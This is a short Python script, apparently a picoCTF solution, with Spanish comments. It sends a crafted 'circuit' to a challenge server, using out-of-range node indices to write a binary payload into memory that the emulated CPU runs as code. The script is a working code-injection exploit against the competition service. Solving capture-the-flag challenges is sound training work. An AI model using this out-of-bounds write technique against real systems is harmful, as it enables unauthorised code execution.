import struct
import requests

# Leer el programa ganador
with open('programs/flag.bin', 'rb') as f:
    flag_bin = f.read()
words = struct.unpack(f'<{len(flag_bin)//2}H', flag_bin)

circuit = []

# 1. Resolver lógica de NOT (para obtener éxito lógico y evitar 0x3333)
# Nodos 5-8 (inputs) -> 1-4 (outputs)
for i in range(4):
    circuit.append({"input1": 5+i, "input2": 5+i, "output": 1+i})

# 2. Inyección del código de la Flag 2
# Usamos el offset de memoria para reescribir la tabla de resultados
# Escribimos los bytes de flag.bin en la zona que la CPU usa como éxito
for i, val in enumerate(words):
    # Escribimos en el espacio de memoria que el CPU interpreta como código
    # El nodo 61440 apunta a 0x0000
    circuit.append({"input1": val, "input2": val, "output": 61440 + i})

url = "http://activist-birds.picoctf.net:57005/check"
response = requests.post(url, json={"circuit": circuit})
print(response.json())
